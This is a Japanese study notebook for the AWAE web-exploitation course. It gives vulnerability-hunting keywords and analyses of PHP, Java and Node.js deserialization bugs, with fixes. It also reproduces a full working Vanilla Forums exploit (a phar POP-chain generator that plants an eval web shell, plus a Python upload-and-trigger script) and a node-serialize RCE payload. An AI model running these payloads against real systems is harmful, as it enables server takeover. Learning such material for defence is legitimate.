<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [AWAE-preparation](#awae-preparation)
- [脆弱性発見方法](#%E8%84%86%E5%BC%B1%E6%80%A7%E7%99%BA%E8%A6%8B%E6%96%B9%E6%B3%95)
  - [キーワード](#%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89)
    - [Node.js](#nodejs)
    - [Java Deserialization](#java-deserialization)
    - [PHP](#php)
      - [PHP Deserialization](#php-deserialization)
      - [PHP XXE Injection](#php-xxe-injection)
      - [PHP Type Juggling](#php-type-juggling)
      - [PHP XSS](#php-xss)
      - [PHP XXE](#php-xxe)
      - [PHP Directory Traversal](#php-directory-traversal)
      - [その他](#%E3%81%9D%E3%81%AE%E4%BB%96)
    - [Command Injection](#command-injection)
- [Vuln](#vuln)
  - [sample](#sample)
  - [Deserialization](#deserialization)
    - [WordPress < 3.6.1 (is_serialized()) PHP Object Injection](#wordpress--361-is_serialized-php-object-injection)
    - [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability](#vanilla-forums-gdn_format-unserialize-remote-code-execution-vulnerability)
    - [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution](#vanilla-forums-importcontroller-index-file_exists-unserialize-remote-code-execution)
    - [Apache Groovy (CVE-2015-3253)](#apache-groovy-cve-2015-3253)
    - [nodejs-serialize (CVE-2017-5941)](#nodejs-serialize-cve-2017-5941)
    - [serialize-to-js (Node.js)](#serialize-to-js-nodejs)
  - [Command Injection](#command-injection-1)
    - [dustjs-helper (Node.js)](#dustjs-helper-nodejs)
  - [Information leak](#information-leak)
    - [new Buffer(100); (Node.js)](#new-buffer100-nodejs)
- [その他](#%E3%81%9D%E3%81%AE%E4%BB%96-1)
  - [githubのOSSのディレクトリ構成](#github%E3%81%AEoss%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%A7%8B%E6%88%90)
  - [dockerでの環境構築](#docker%E3%81%A7%E3%81%AE%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89)
    - [コマンドとかのメモ](#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A8%E3%81%8B%E3%81%AE%E3%83%A1%E3%83%A2)
    - [nginx + php-fpm](#nginx--php-fpm)
- [メモ](#%E3%83%A1%E3%83%A2)
- [ToDO](#todo)
- [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# AWAE-preparation

# 脆弱性発見方法
エラー文が出て入れば、その該当箇所のソースコードをgithubで探して、wikiとかTutorialとかissueを見る。   
Injection系はevalを探す。   
見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。   
## キーワード
### Node.js
`eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`,`deserialize`,`new Function`   
### Java Deserialization
`readObject`,`readExternal`,`readUnshared`,`XStream`,`AC ED`で始まるバイトストリーム(Serializeされたことを示すマジックナンバー)、`ObjectInputStream`,`ObjectOutputStream`,`defaultReadObject`,`Apache Commons Collections`   
### PHP
#### PHP Deserialization
`unserialize`,`__construct`,`__destruct`,`__wakeup`,`__toString`   
PHAR形式のファイルをアップロードできてその場所が特定できるなら(ファイル名も)、`file()`,`file_exist()`,`file_get_contents()`,`fopen()`,`rename()`,`unlink()`,`include()`。`form`とかで入力がどこにあるのかもわかるかも。PHARファイルの保存先のパスを指定するための変数`path`があるかも。   
#### PHP XXE Injection
変数名`xml`,`loadXML`,`simplexml_load_string`,`svg`
#### PHP Type Juggling
`==`,`!=`,`eval`  
#### PHP XSS
`$_SERVER['PHP_SELF']`  
#### PHP XXE
`file_get_contents`,`loadXML`  
#### PHP Directory Traversal
`file_get_contetns`(外部のURLも可)  
#### その他
https://www.hamayanhamayan.com/entry/2020/08/09/193357  
- `ob_start()`  
`ob_start()`で`ob_end_clean();`までの出力をバッファに入力しておける。これはfatal errorを発生させることで中止できるらしい。  
`O:11:"Traversable":0:{}`をunserializeさせることで、抽象クラスを作ろうとしてエラーを出せるらしい。  
https://wrecktheline.com/writeups/3kctf-2020/#xsser  
- `if ($_GET['a'] !== $_GET['b'] && hash("sha256", $_GET['a']) === hash("sha256", $_GET['b']))`  
https://ctftime.org/task/12375  
`?a[0]=0&b[1]=0`もしくは`?a[]=0&b[]=1`でこの条件に入れるらしい？？？  
- `md5($var1, true)`  
https://ndb796.tistory.com/332  
第二引数に`true`とするとバイナリ形式の出力結果になるらしくて、`mysql_query("select * from users where password='".md5($pass,true)."');`のような実装になっている場合、ハッシュ化したバイナリの中に`'='`という部分が出現すれば、`password='aaa'='bbb'`となってこれはTrueとなる。  
`7201387`をハッシュかしたら`'='`というパターンが中に含まれている！  
- `opcache`  
https://www.sousse.love/post/carthagods-3kctf2020/index.html  
phpinfoが見れて、`opcache.file_cache = /var/www/cache/`となってopchacheがセットされていれば、webroot上に存在する`flag.php`には`/var/www/cache/[system_id]/var/www/html/flag.php.bin`でアクセスできる。このsystem idは`python ./system_id_scraper.py http://carthagods.3k.ctf.to:8039/info.php`みたいにしてこのスクリプトを使って特定できるらしい？？  

### Command Injection
`system`,`exec`,`create_function`
# Vuln
## sample
- 概要   
- 例   
- 発見方法   
- 対策   
- 参考資料   
## Deserialization
### WordPress < 3.6.1 (is_serialized()) PHP Object Injection
- 概要   
wordpressではユーザーのメタデータ(名前とかの情報)をシリアライズしたりしなかったりしてデータベースに保存する。そのため、メタデータを取得するときには`unserialize`するべきデータとするべきではないデータ(そもそもシリアル化されてないデータ)の2種類存在するので、`unserialize`したりしなかったりする必要がある。   
ここで、じゃあ入力に`i:1;`を入れれば、このままデータベースに保存されて、データベースから取り出すときに`unserialize`されて`1`を取得するのでは？って思うがそうはならない。入力が`i:1;`の場合、`is_serialized()`でシリアル化されたデータと判断して、さらにもう一回シリアライズして`s:4:"i:1;";`としてデータベースに保存する。   
これによって一応シリアライズされたデータを挿入しても`unserialize`しないようになっている。   
しかし、その「データがシリアル化されているかどうか」を判断する`is_serialized()`メソッドで、`i:1;𝌆`という文字列の場合、最後が`;`,`}`で終わっていないのでシリアル化されているとはみなさずにこのままデータベースに保存しようとするが、MySQLではこの`𝌆`というUnicode文字列を扱えないので捨てられて`i:1;`として保存されてしまう。   
これによってデータベースから取り出すときにシリアライズされたデータとみなして`unserialize`されてしまう！   
つまり、`O:4:"Test":{...}𝌆`的なPayloadをユーザーのメタデータとして登録すれば、そのデータを取り出すときに`unserialize`されてRCEできるかも！ってこと。   
- 例   
メタデータをデータベースから取得する`get_metadata()`は以下をする。   
```php
if ( isset($meta_cache[$meta_key]) ) {
    if ( $single )
        return maybe_unserialize( $meta_cache[$meta_key][0] );
    else
        return array_map('maybe_unserialize', $meta_cache[$meta_key]);
}
```
`maybe_unserialize`は以下の通りでシリアライズされたデータなら`unserialize`、そうでないならそのまま返す。   
```php
function maybe_unserialize( $original ) {
    if ( is_serialized( $original ) ) // don't attempt to unserialize data that wasn't serialized going in
        return @unserialize( $original );
    return $original;
}
```
`is_serialized()`は以下の通りで、シリアライズされたデータかどうか判断している。   
```php
function is_serialized( $data ) {
    // if it isn't a string, it isn't serialized
    if ( ! is_string( $data ) )
        return false;
    $data = trim( $data );
     if ( 'N;' == $data )
        return true;
    $length = strlen( $data );
    if ( $length < 4 )
        return false;
    if ( ':' !== $data[1] )
        return false;
    $lastc = $data[$length-1];
    if ( ';' !== $lastc && '}' !== $lastc )
        return false;
    $token = $data[0];
    switch ( $token ) {
        case 's' :
            if ( '"' !== $data[$length-2] )
                return false;
        case 'a' :
        case 'O' :
            return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
        case 'b' :
        case 'i' :
        case 'd' :
            return (bool) preg_match( "/^{$token}:[0-9.E-]+;\$/", $data );
    }
    return false;
}
```
メタデータを更新する`update_metadata()`は以下の通り。   
```php
// …
    $meta_value = wp_unslash($meta_value);
    $meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type );
// …
    $meta_value = maybe_serialize( $meta_value );
    
    $data  = compact( 'meta_value' );
// …
    $wpdb->update( $table, $data, $where );
// …
```
`maybe_serialize`は以下の通り。   
```php
function maybe_serialize( $data ) {
    if ( is_array( $data ) || is_object( $data ) )
        return serialize( $data );

    // Double serialization is required for backward compatibility.
    // See http://core.trac.wordpress.org/ticket/12930
    if ( is_serialized( $data ) )
        return serialize( $data );

    return $data;
}
```
- 発見方法   
`unserialize`が呼ばれている箇所を特定して、どういうデータがそこに呼ばれているのかを確認する？   
- 対策   
`$strict`が追加されてる。最後の文字が`;`,`}`かどうかでチェックしないようになっているらしい。   
```php
function is_serialized( $data, $strict = true ) {
     // if it isn't a string, it isn't serialized
     if ( ! is_string( $data ) )
         return false;
     if ( ':' !== $data[1] )
         return false;
    if ( $strict ) {
        $lastc = $data[ $length - 1 ];
        if ( ';' !== $lastc && '}' !== $lastc )
            return false;
    } else {
        // ensures ; or } exists but is not in the first X chars
        if ( strpos( $data, ';' ) < 3 && strpos( $data, '}' ) < 4 )
            return false;
    }
     $token = $data[0];
     switch ( $token ) {
         case 's' :
            if ( $strict ) {
                if ( '"' !== $data[ $length - 2 ] )
                    return false;
            } elseif ( false === strpos( $data, '"' ) ) {
                 return false;
            }
         case 'a' :
         case 'O' :
             return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
         case 'b' :
         case 'i' :
         case 'd' :
            $end = $strict ? '$' : '';
            return (bool) preg_match( "/^{$token}:[0-9.E-]+;$end/", $data );
     }
     return false;
 }
```
- 参考資料   
https://tom.vg/2013/09/wordpress-php-object-injection/   
### Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability
- 概要   
AuthenticatedなAdminユーザーがPOSTの`Garden-dot-TouchIcon`パラメータの値にシリアライズした文字列を設定すると、`unserialize`まで到達してRCEができる。   
- 例   
`c('Garden.TouchIcon')`は`config($_POST['Garden-dot-TouchIcon'])`的な動作をするらしい。`c`関数は`config`関数のマクロらしい。config関数は`library/core/functions.general.php`で定義されている。      
```php
class Gdn_Controller extends Gdn_Pluggable {

    ...

    public function renderMaster() {
        // Build the master view if necessary
        if (in_array($this->_DeliveryType, [DELIVERY_TYPE_ALL])) {

        ...

            $touchIcon = c('Garden.TouchIcon');                                     // 1
            if ($touchIcon) {
                $this->Head->setTouchIcon(Gdn_Upload::url($touchIcon));
            }
```
この`config`メソッドが呼び出されてるっぽい？   
この中でさらに`Gdn::config`(Gndクラスで定義されたconfigメソッド)が呼ばれてる。   
```php
if (!function_exists('config')) {
    /**
     * Retrieves a configuration setting.
     *
     * @param string|bool $name The name of the configuration setting.
     * Settings in different sections are separated by dots.
     * @param mixed $default The result to return if the configuration setting is not found.
     * @return mixed The configuration setting.
     * @see Gdn::config()
     */
    function config($name = false, $default = false) {                              // 2
        return Gdn::config($name, $default);
    }
}
```
中で`get`メソッドが呼ばれている。ここまででPOSTで入力したデータは`$name`にある？   
```php
class Gdn {

    ...

    /**
     * Get a configuration setting for the application.
     *
     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')
     * @param mixed $default The result to return if the configuration setting is not found.
     * @return Gdn_Configuration|mixed The configuration setting.
     */
    public static function config($name = false, $default = false) {
        if (self::$_Config === null) {
            self::$_Config = static::getContainer()->get(self::AliasConfig);
        }
        $config = self::$_Config;
        if ($name === false) {
            $result = $config;
        } else {
            $result = $config->get($name, $default);        // 3
        }

        return $result;
    }
```
ここで`Gdn_Format::unserialize($value);`でユーザーの入力が`Gdn_Format`クラスで定義された`unserialize`メソッドに入力されているらしい…。でも`$name`が`$value`に代入されてる様子もないし…。なんで`$name`から`$value`に入力が移ってるのか不明…。   
この`unserialize`はユーザーが定義したものでデフォルトではないのでその定義を確認する。   
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    public function get($name, $defaultValue = false) {
        // Shortcut, get the whole config
        if ($name == '.') {
            return $this->Data;
        }

        $keys = explode('.', $name);
        // If splitting is off, HANDLE IT
        if (!$this->splitting) {
//         $FirstKey = getValue(0, $Keys);
            $firstKey = $keys[0];
            if ($firstKey == $this->defaultGroup) {
                $keys = [array_shift($keys), implode('.', $keys)];
            } else {
                $keys = [$name];
            }
        }
        $keyCount = count($keys);

        $value = $this->Data;
        for ($i = 0; $i < $keyCount; ++$i) {
            if (is_array($value) && array_key_exists($keys[$i], $value)) {
                $value = $value[$keys[$i]];
            } else {
                return $defaultValue;
            }
        }

        if (is_string($value)) {
            $result = Gdn_Format::unserialize($value);                          // 4
        } else {
            $result = $value;
        }

        return $result;
    }
```
中でデフォルトの`unserialize`が実行されている。   
```php
class Gdn_Format {

    ...

    /**
     * Takes a serialized variable and unserializes it back into its original state.
     * 
     * @param string $serializedString A json or php serialized string to be unserialized.
     * @return mixed
     */
    public static function unserialize($serializedString) {
        $result = $serializedString;

        if (is_string($serializedString)) {
            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {
                $result = unserialize($serializedString);                          // 5
            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {
                $result = json_decode(substr($serializedString, 4), false);
            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {
                $result = json_decode(substr($serializedString, 4), true);
            }
        }
        return $result;
    }
```
- 発見方法   
`unserialize`が呼び出されている場所を特定して、そのメソッドがどこで呼ばれているのかを確認する。そうやってたどっていってユーザーの入力があればOK?って感じ？   
- 対策   
ユーザーの入力を`unserialize`に入れてはいけない。   
- 参考資料   
https://hackerone.com/reports/407552   
### Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution
- 概要   
認証された管理者ユーザーは、シリアル化されたペイロードをpharアーカイブに挿入し、保護されていないfile_exists（）を介してそのペイロードへの読み取りアクセスをトリガーできます。攻撃者はこれを利用して、信頼できないデータを逆シリアル化し、リモートでコードが実行される可能性があります。   
つまり、`phar`形式でMetaデータにシリアライズしたオブジェクトを書いておいたファイルを何らかの方法でアップロードして、そのファイルへのパスを`phar://var/www.../attack.jpg`みたいにして`file_exits()`に挿入できればデシリアライズされてRCEできる！   
`phar`形式のファイルは非常に危険で単に`file_exeits('phar://www/..')`みたいにして`phar`ファイルを呼び出すだけで脆弱！しかも`phar`ファイルは拡張子に依存しないので`.jpg`としてアップしても普通に`phar`がいるとｈして動作する！   
- 例   
[1]で`$this->Form->getFormValue('PathSelect')`でフォームの`name="PathSelect"`の値が`'NEW'`かどうかチェックしてる。   
[2]で`$pathSelect`にユーザーによるこの値をセットする。   
[3]で`$imp->ImportPath`にこの`$pathSelect`をセットする。   
[4]で`file_exists($imp->ImportPath)`が呼ばれるので、ユーザーの入力がそのまま`file_exists()`に入っており脆弱！   
```php
class ImportController extends DashboardController {

    ...

    public function index() {
        $this->permission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.
        $timer = new Gdn_Timer();

        // Determine the current step.
        $this->Form = new Gdn_Form();
        $imp = new ImportModel();
        $imp->loadState();

        // Search for the list of acceptable imports.
        $importPaths = [];
        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);
        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);
        $existingPaths = array_merge($existingPaths, $existingPaths2);
        foreach ($existingPaths as $path) {
            $importPaths[$path] = basename($path);
        }
        // Add the database as a path.
        $importPaths = array_merge(['db:' => t('This Database')], $importPaths);

        if ($imp->CurrentStep < 1) {
            // Check to see if there is a file.
            $importPath = c('Garden.Import.ImportPath');
            $validation = new Gdn_Validation();


            if (Gdn::request()->isAuthenticatedPostBack(true)) {
                $upload = new Gdn_Upload();
                $validation = new Gdn_Validation();
                if (count($importPaths) > 0) {
                    $validation->applyRule('PathSelect', 'Required', t('You must select a file to import.'));
                }

                if (count($importPaths) == 0 || $this->Form->getFormValue('PathSelect') == 'NEW') {                 // 1
                    $tmpFile = $upload->validateUpload('ImportFile', false);
                } else {
                    $tmpFile = '';
                }

                if ($tmpFile) {
                    $filename = $_FILES['ImportFile']['name'];
                    $extension = pathinfo($filename, PATHINFO_EXTENSION);
                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';
                    if (!file_exists($targetFolder)) {
                        mkdir($targetFolder, 0777, true);
                    }
                    $importPath = $upload->generateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);
                    $upload->saveAs($tmpFile, $importPath);
                    $imp->ImportPath = $importPath;
                    $this->Form->setFormValue('PathSelect', $importPath);

                    $uploadedFiles = val('UploadedFiles', $imp->Data);
                    $uploadedFiles[$importPath] = basename($filename);
                    $imp->Data['UploadedFiles'] = $uploadedFiles;
                } elseif (($pathSelect = $this->Form->getFormValue('PathSelect'))) {                                // 2
                    if ($pathSelect == 'NEW') {
                        $validation->addValidationResult('ImportFile', 'ValidateRequired');
                    } else {
                        $imp->ImportPath = $pathSelect;                                                             // 3
                    }
                } elseif (!$imp->ImportPath && count($importPaths) == 0) {
                    // There was no file uploaded this request or before.
                    $validation->addValidationResult('ImportFile', $upload->Exception);
                }

                // Validate the overwrite.
                if (true || strcasecmp($this->Form->getFormValue('Overwrite'), 'Overwrite') == 0) {
                    if (!stringBeginsWith($this->Form->getFormValue('PathSelect'), 'Db:', true)) {
                        $validation->applyRule('Email', 'Required');
                    }
                }

                if ($validation->validate($this->Form->formValues())) {
                    $this->Form->setFormValue('Overwrite', 'overwrite');
                    $imp->fromPost($this->Form->formValues());
                    $this->View = 'Info';
                } else {
                    $this->Form->setValidationResults($validation->results());
                }
            } else {
                $this->Form->setFormValue('PathSelect', $imp->ImportPath);
            }
            $imp->saveState();
        } else {
            $this->setData('Steps', $imp->steps());
            $this->View = 'Info';
        }

        if (!stringBeginsWith($imp->ImportPath, 'db:') && !file_exists($imp->ImportPath)) {                         // 4
            $imp->deleteState();
        }
```
攻撃手順は、まず`phar`形式のファイルpoc.jpgを作成する。これは`jpg`ファイルに偽装してるが`phar`形式のファイルでありメタデータにシリアライズしたオブジェクトが書かれれている。   
このpopchainについては以下を参照。   
https://github.com/takabaya-shi/AWAE-preparation/blob/main/php/PHP%20Object%20Injection/README.md   
https://hackerone.com/reports/407552   
```php
<?php
/*

Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability
mr_me 2018

## Notes:

- This is the file that generates the payload to help trigger the bug
- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc
  if needed. I have installed my version of Vanilla Forums in /var/www/html

## Example:

The following steps are used to re-create the vulnerability:

1. We create our phar file:

`saturn:~ mr_me$ php poc-stage-1.php`

3. We run the poc-stage-2.py which will trigger the bug

```
saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123
(+) targeting: http://172.16.175.143
(+) logged in!
(+) uploaded phar!
(+) leaked phar name!
(+) triggered a write!
(+) shell at: http://172.16.175.143/?c=phpinfo();

saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, on the victim box:

```
steven@pluto:/var/www/html/conf$ cat constants.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$
```
*/

// custom pop chain, as used in other exploits
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}

// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
```
次にこのファイルをアップロードして、何らかのリクエストで`file_exists()`の中にこのアップされたファイルへのパスを挿入する。   
まずCSRFトークンを取得する。以降の手順ではすべてリクエストにCSRFトークンがないとダメっぽいので取得しておく。   
次に`jpg`に偽装した`phar`ファイルをアップロードする。   
次にアップした`phar`ファイルの名前を取得する。`attack.jpg`とかでアップしても実際にはタイムスタンプとかランダムな名前で保存されることになるので。   
次に得られたファイル名で`phar://.../???.jpg`のパスを作成してリクエストして`file_exitst()`の中にInjectする！   
```python
import re
import sys
import string
import random
import urllib2
import requests

def get_csrf(t, c):
    """
    Gets the csrf for any page thats logged in.
    """
    r = s.get("%s/index.php" % t)
    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
    if match:
        Vanilla_tk = r.headers['Set-Cookie']
        csrf = match.group(1)
        if Vanilla_tk.split("=")[1].startswith(csrf):
            return Vanilla_tk

def get_csrf_login(t):
    """
    Gets the CSRF cookie for the login process
    """
    r = requests.get("%s/index.php?p=/entry/signin" % t)
    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
    if match:
        Vanilla_tk = r.headers['Set-Cookie']
        csrf = match.group(1)
        if Vanilla_tk.split("=")[1].startswith(csrf):
            return Vanilla_tk

def extract_csrf(csrf):
    """
    Extracts the csrf token from the cookie
    """
    token = urllib2.unquote(csrf).decode('utf8')
    m = re.search("Vanilla-tk=(.*)\:\d{1,2}:", token)
    if m:
        k = m.group(1)
        c["Vanilla-tk"] = token.split("=")[1]
        return k, c

def we_can_trigger_unserialize(t, csrf):
    """
    This is our malicious phar:// and it can be in a share if we are targeting windows.
    Change the path if you need to.
    """
    k, c = extract_csrf(csrf)
    p = {
        "TransientKey": k,
        "PathSelect": "phar:///var/www/html/uploads/%s.jpg" % leaked,    # This is where we do the injection. This trick is quite old actually.
    }
    r = s.post("%s/index.php?p=/dashboard/import" % t, data=p)
    if r.status_code == 200 and "Email is required" in r.text:
        return True
    return False


def we_can_leak_phar_name(t, csrf):
    """
    This function leaks the filename of the image. We use the General category
    because its default id is 1.
    """
    global leaked
    k, c = extract_csrf(csrf)
    r = s.get("%s/index.php?p=/categories" % t)
    r.text
    match = re.search("uploads/(.*).jpg\" class=\"CategoryPhoto\" alt=\"General\"", r.text)
    if match:
        leaked = match.group(1)
        return True
    return False

def we_can_upload(t, csrf):
    """
    This function uploads the phar archive that we crafted
    """
    k, c = extract_csrf(csrf)
    f = { 'Photo_New': open('poc.jpg', 'rb') }
    p = {
      'TransientKey': k,
      'CategoryID': 1,
      'Save': "Save",
    }
    r = s.post("%s/index.php?p=/vanilla/settings/editcategory" % t, files=f, data=p, allow_redirects=False)
    if r.status_code == 302 and "vanilla/settings/categories" in r.headers['Location']:
        return True
    return False


def we_can_login(t, usr, pwd, csrf):
    """
    We just log in with this function
    """
    global s
    s = requests.session()
    k, c = extract_csrf(csrf)
    p = {
        "TransientKey": k,
        "Email": usr,
        "Password": pwd,
        "DeliveryType": "VIEW",
    }
    r = s.post("%s/index.php?p=/entry/signin" % t, cookies=c, data=p)
    if r.status_code == 200 and "\"FormSaved\": true" in r.text:
        return True
    return False

def main():
    """
    Start the pain train
    """
    global c, pwner_user
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <username:password>" % sys.argv[0]
        print "(+) eg: %s 172.16.175.143 admin:admin123" % sys.argv[0]
        sys.exit(-1)
    t = "http://%s" % sys.argv[1]
    c = sys.argv[2]
    usr = c.split(":")[0]
    pwd = c.split(":")[1]
    c = {}
    print "(+) targeting: %s" % t
    if we_can_login(t, usr, pwd, get_csrf_login(t)):
        print "(+) logged in!"
        csrf = get_csrf(t, c)
        if we_can_upload(t, csrf):
            print "(+) uploaded phar!"
            if we_can_leak_phar_name(t, csrf):
                print "(+) leaked phar name %s.jpg!" % leaked
                if we_can_trigger_unserialize(t, csrf):
                    print "(+) triggered a write!"
                    print "(+) shell at: %s/?c=phpinfo();" % (t)

if __name__ == '__main__':
    main()
```
- 発見方法   
アップロードする機能があって、かつ`file_exitst()`の中にユーザーの入力がValidation無しで入ることが問題なので、`file_exits`の中に入る値を逆算していけば見つけられそう？   
- 対策   
ユーザーの入力に`phar`,`:`,`://`などが入っていることが問題。拡張子だけチェックしても子の場合はどうしようもない。   
ここら辺のValidationをする部分がないのが問題。   
- 参考資料   
https://hackerone.com/reports/407552   
https://blog.ohgaki.net/php-phar-remote-code-execution-vulnerability   
`phar`の脆弱性についての情報。かなりわかりやすい。   
https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254380e9   
`phar`のDeserializeの脆弱性について。   
https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066   
`phar`の脆弱性のWordpressでの具体例。   
### Apache Groovy (CVE-2015-3253)
- 概要   
バージョン1.7.0 through 2.4.3で、MethodClosureクラスがデシリアライズされてしまうことが脆弱。このクラスはインスタンスを作成するだけで任意コマンドを実行できる仕様なので、デシリアライズするだけでRCEできてしまう。   
- 例   
https://github.com/takabaya-shi/AWAE-preparation/blob/main/java/Deserialization/README.md#manually-exploit   
を参照。   
- 発見方法   
Groovyライブラリでコマンドを実行する方法としてMethodClosureクラスがあるので、これがデシリアライズされうるかどうかを調べれば発見できた？(もう遅いけど)   
- 対策   
シリアライズ時のreadResolve()メソッドをオーバーライドして、MethodClosureクラスの場合は再帰的にデシリアライズせずに例外をスローするようにする。   
![image](https://user-images.githubusercontent.com/56021519/102111504-d4f93980-3e79-11eb-8d23-c23a026dfc9d.png)   
- 参考資料   
https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical   
https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/   
### nodejs-serialize (CVE-2017-5941)
- 概要   
Node.jsのnode-serializeパッケージ0.0.4のunserialize（）関数に渡された信頼できないデータを悪用して、即時呼び出し関数式（IIFE）を使用してJavaScriptオブジェクトを渡すことにより、任意のコードを実行できる。   
https://www.cvedetails.com/cve/CVE-2017-5941/   
cvedetails   
https://github.com/luin/serialize/issues/4   
node-serializeのissue。   
- 例   
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
  if (req.cookies.profile) {
    // Cookieのprofileの値をbase64デコード
    var str = new Buffer(req.cookies.profile,
    'base64').toString();
    // ここが脆弱！
    // Cookieの値をbase64デコードしたものを逆シリアライズする
    var obj = serialize.unserialize(str);
    // Cookieの中の値を逆シリアライズによってオブジェクトにして、値を取り出す
    if (obj.username) {
    res.send("Hello " + escape(obj.username));
      }
    } else {
      res.cookie('profile',
      "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo
      iYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
  res.send("Hello World");
});

app.listen(3000);
```
`serialize.unserialize(str)`が脆弱。   
この逆シリアライズする中に、IIFE形式の関数があれば逆シリアライズしたときに呼び出されなくても自動的に実行する。   
```txt
> var x = {'a': function(){console.log('a')}}  // 普通。宣言しただけでは実行されない
undefined
> x.a
[Function: a]
> x.a();  // メソッドを指定して初めて実行される
a
undefined
> var x = {'a': function(){console.log('a')}()}  // IIFE形式。最後に()を足す
a         // 宣言したときにすぐに実行される！
undefined
> 
```
よって、以下のようなシリアライズされた文字列に`()`を付け足してIIFE形式にすることで、逆シリアライズ時に即時実行される。   
ここでは、`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}`をbase64エンコードしたものをCookieにセットするとRCEできる！   
```txt
> var serialize = require('node-serialize');
> var poc = {x: function(){console.log("POC")} }
undefined
> serialize.serialize(poc)
'{"x":"_$$ND_FUNC$$_function(){console.log(\\"POC\\")}"}'
> var y = { rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}, }
undefined
> serialize.serialize(y)
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}"}`
```

- 発見方法   
`unserialize`,`require('node-serialize')`キーワードが含まれているかどうか。   
`node_modules`ディレクトリの中にversion 0.0.4(おそらく最新版でも)の`node-serialize`ディレクトリがあるかどうか。   
- 対策   
`node-serialize`モジュールは最新版でもおそらく修正されてない。   
https://www.npmjs.com/package/node-serialize   
- 参考資料   
https://blacksheephacks.pl/nodejs-deserialization/   
説明。   
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf   
説明。   
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py   
`eval(String.fromCharCode(10,118,...,10))`の形式で書けばクウォートとかを使わずにReverse shellのコードが書ける。   
https://v3ded.github.io/ctf/htb-celestial   
HTBのWriteup。   
- 根本の原因   
このソースの`unserialize`関数の`eval`が良くない。   
https://github.com/luin/serialize/blob/master/lib/serialize.js   
```js
  var FUNCFLAG = '_$$ND_FUNC$$_';
  
  // ここら辺は省略
  
  // objは {"a":"test1","b":"test2"} とか
  unserialize = function(obj, originObj) {
    var isIndex;
    if (typeof obj === 'string') {
      obj = JSON.parse(obj);
      isIndex = true;
    }
    originObj = originObj || obj;

    var circularTasks = [];
    var key;
    // objオブジェクトのプロパティをkeyに代入。 "a","b"が順次代入される    
    for(key in obj) {
      if(obj.hasOwnProperty(key)) {
        if(typeof obj[key] === 'object') {
          obj[key] = unserialize(obj[key], originObj);
          // obj["a"]つまり"test1"がString型かどうかチェック
        } else if(typeof obj[key] === 'string') {
